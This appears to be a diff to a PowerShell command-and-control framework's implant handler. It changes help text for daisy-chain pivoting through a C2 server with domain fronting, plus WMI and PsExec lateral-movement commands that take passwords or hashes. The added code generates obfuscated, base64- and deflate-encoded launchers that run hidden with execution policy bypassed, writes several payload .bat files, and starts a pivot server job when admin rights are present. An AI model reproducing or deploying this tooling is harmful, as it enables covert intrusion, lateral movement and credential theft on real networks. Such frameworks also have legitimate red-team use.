@@ -140,7 +140,7 @@ function Implant-Handler
         write-host " Invoke-Expression (Get-Webclient).DownloadString(`"https://module.ps1`")" -ForegroundColor Green
         write-host " StartAnotherImplant or SAI" -ForegroundColor Green 
         write-host " StartAnotherImplantWithProxy" -ForegroundColor Green 
-        write-host " Invoke-DaisyChain -port 4444 -daisyserver http://192.168.1.1 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass" -ForegroundColor Green
+        write-host " Invoke-DaisyChain -port 80 -daisyserver http://192.168.1.1 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass" -ForegroundColor Green
         write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green
         write-host " Get-MSHotfixes" -ForegroundColor Green 
         write-host " Get-FireWallRulesAll | Out-String -Width 200" -ForegroundColor Green 
@@ -222,7 +222,7 @@ function Implant-Handler
         write-host " Invoke-PsExecPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
         write-host " Invoke-PsExecProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
         write-host " Invoke-WMIProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
-        write-host " Invoke-WMIDaisyPayload -IPList/-IPRangeCIDR/-IPAddress <ip> -user <dom\user> -pass '<pass>'" -ForegroundColor Green
+        write-host " Invoke-WMIDaisyPayload -Target <ip> -Domain <dom> -user <user> -pass '<pass>'" -ForegroundColor Green
         #write-host " EnableWinRM | DisableWinRM -computer <dns/ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
         write-host " Invoke-WinRMSession -IPAddress <ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
         write-host `n "Credentials / Tokens / Local Hashes (Must be SYSTEM): " -ForegroundColor Green
@@ -521,15 +521,39 @@ $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
 $NewScript = 'sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
 $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
 $EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($NewScript))    
-$startscript = "start-process `"powershell`" -argumentlist `"-exec bypass -Noninteractive -windowstyle hidden -c $NewScript`""
-[IO.File]::WriteAllLines("$FolderPath\payloads\daisyserver.bat", $startscript)
-Write-Host -Object "DaisyServer bat written to: $FolderPath\payloads\daisyserver.bat"  -ForegroundColor Green
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($daisycommand)
 $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
 $payload = $payloadraw -replace "`n", ""
-[IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload.bat", $payload)
-Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload.bat"  -ForegroundColor Green
-return $startscript
+
+if (-not (Test-Path "$FolderPath\payloads\daisypayload.bat")){
+    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload.bat", $payload)
+    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload.bat"  -ForegroundColor Green
+} 
+if (-not (Test-Path "$FolderPath\payloads\daisypayload2.bat")){
+    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload2.bat", $payload)
+    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload2.bat"  -ForegroundColor Green
+}
+if (-not (Test-Path "$FolderPath\payloads\daisypayload3.bat")){
+    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload3.bat", $payload)
+    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload3.bat"  -ForegroundColor Green
+}
+if (-not (Test-Path "$FolderPath\payloads\daisypayload4.bat")){
+    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload4.bat", $payload)
+    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload4.bat"  -ForegroundColor Green
+}
+$rundaisy = @"
+`$t = Invoke-Netstat| ? {`$_.ListeningPort -eq $port}
+if (!`$t) { 
+    if (Test-Administrator) { 
+        start-job -ScriptBlock {$NewScript} | Out-Null 
+    }
+}
+
+"@
+[IO.File]::WriteAllLines("$FolderPath\payloads\daisyserver.bat", $rundaisy)
+Write-Host -Object "DaisyServer bat written to: $FolderPath\payloads\daisyserver.bat"  -ForegroundColor Green
+
+return $rundaisy
 }
 
 function Resolve-PathSafe
@@ -778,9 +802,9 @@ param
             if ($pscommand.ToLower().StartsWith('invoke-wmidaisypayload'))
             {
                 if (Test-Path "$FolderPath\payloads\daisypayload.bat"){ 
-                    CheckModuleLoaded "Invoke-WMICommand.ps1" $psrandomuri
+                    CheckModuleLoaded "Invoke-WMIExec.ps1" $psrandomuri
                     $proxypayload = Get-Content -Path "$FolderPath\payloads\daisypayload.bat"
-                    $pscommand = $pscommand -replace 'Invoke-WMIDaisyPayload', 'Invoke-WMICommand'
+                    $pscommand = $pscommand -replace 'Invoke-WMIDaisyPayload', 'Invoke-WMIExec'
                     $pscommand = $pscommand + " -command '$proxypayload'"
                 } else {
                     write-host "Need to run Invoke-DaisyChain first"
